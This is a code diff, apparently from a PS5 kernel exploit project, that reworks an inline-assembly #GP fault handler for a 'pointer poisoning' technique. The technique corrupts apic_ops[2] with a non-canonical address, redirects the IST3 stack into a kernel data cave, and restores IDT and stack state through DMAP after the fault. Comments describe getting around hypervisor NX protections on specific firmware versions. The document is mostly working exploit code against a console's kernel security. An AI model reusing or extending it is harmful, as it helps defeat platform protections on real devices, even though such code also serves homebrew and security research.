@@ -562,17 +562,33 @@ void hv_idt_trampoline(void) {
 }
 
 /* ============================================================
- * Phase 9: #GP handler for flatz suspend/resume method
+ * Phase 9: #GP handler for flatz pointer poisoning method
  *
- * This naked function runs when #GP fires during resume after
- * apic_ops[2] has been poisoned with a non-canonical address.
- * It runs on the IST3 stack (set to a cave in kdata).
+ * This naked function runs when #GP fires after apic_ops[2]
+ * has been poisoned with a non-canonical address (0xdeb7 prefix).
+ * It runs on the IST3 stack (redirected to a cave in kdata).
  *
- * The handler:
- *   1. Reads 8 bytes from ktext (proof of readability)
- *   2. Restores original IDT[13] from backup in cave
- *   3. Restores original apic_ops[2] value
- *   4. Returns via iretq to re-execute the faulting call
+ * The handler lives in KLD module .text, which is in dynamically
+ * allocated kernel memory — NPT-executable on FW 4.03 (GMET not
+ * enforced until FW 6.50).  This solves the kdata-is-NX problem:
+ *   kdata cave: writable but NX under NPT → can't execute
+ *   kmod .text: kernel-linker-allocated → NPT allows execution
+ *
+ * Technique from ps5-kstuff "On offsets" documentation:
+ *   - Pointer poisoning: top 16 bits → 0xdeb7 (non-canonical)
+ *   - #GP fires on call through poisoned pointer
+ *   - Handler restores everything, iretq re-executes the call
+ *
+ * The handler restores THREE things:
+ *   1. IDT[13] — original #GP handler (from cave backup via DMAP)
+ *   2. apic_ops[2] — original xapic_mode pointer (via DMAP)
+ *   3. IST3 — original interrupt stack (via DMAP)
+ * Then pops the error code and iretq back to the faulting call,
+ * which now succeeds with the restored valid pointer.
+ *
+ * NOTE: No ktext reads — ktext is XOM under NPT during normal
+ * operation.  Reading ktext would cause #NPF → crash.  The ktext
+ * read proof is deferred to a future resume-specific handler.
  *
  * The 6 movabs immediates are patched at runtime by userland
  * via DMAP before the pointer is poisoned.  Each has a unique
@@ -589,21 +605,20 @@ void gp_handler(void) {
         "push %%rdi\n"
         "cld\n"
 
-        /* 1. Read 8 bytes from ktext → proof in cave */
-        "movabs $0xDEAD000000000001, %%rsi\n"   /* ktext VA to read */
-        "mov (%%rsi), %%rax\n"
-        "movabs $0xDEAD000000000002, %%rdi\n"   /* cave proof slot (DMAP) */
-        "mov %%rax, (%%rdi)\n"
-
-        /* 2. Restore IDT[13]: 16 bytes from cave backup → IDT */
-        "movabs $0xDEAD000000000003, %%rsi\n"   /* cave IDT backup (DMAP) */
-        "movabs $0xDEAD000000000004, %%rdi\n"   /* IDT[13] location (DMAP) */
+        /* 1. Restore IDT[13]: 16 bytes from cave backup → IDT */
+        "movabs $0xDEAD000000000001, %%rsi\n"   /* IDT backup source (DMAP) */
+        "movabs $0xDEAD000000000002, %%rdi\n"   /* IDT[13] destination (DMAP) */
         "mov $16, %%ecx\n"
         "rep movsb\n"
 
-        /* 3. Restore apic_ops[2] */
-        "movabs $0xDEAD000000000005, %%rax\n"   /* original xapic_mode VALUE */
-        "movabs $0xDEAD000000000006, %%rdi\n"   /* apic_ops[2] (DMAP) */
+        /* 2. Restore apic_ops[2] */
+        "movabs $0xDEAD000000000003, %%rax\n"   /* original xapic_mode VALUE */
+        "movabs $0xDEAD000000000004, %%rdi\n"   /* apic_ops[2] (DMAP) */
+        "mov %%rax, (%%rdi)\n"
+
+        /* 3. Restore IST3 */
+        "movabs $0xDEAD000000000005, %%rax\n"   /* original IST3 VALUE */
+        "movabs $0xDEAD000000000006, %%rdi\n"   /* IST3 (DMAP) */
         "mov %%rax, (%%rdi)\n"
 
         "pop %%rdi\n"
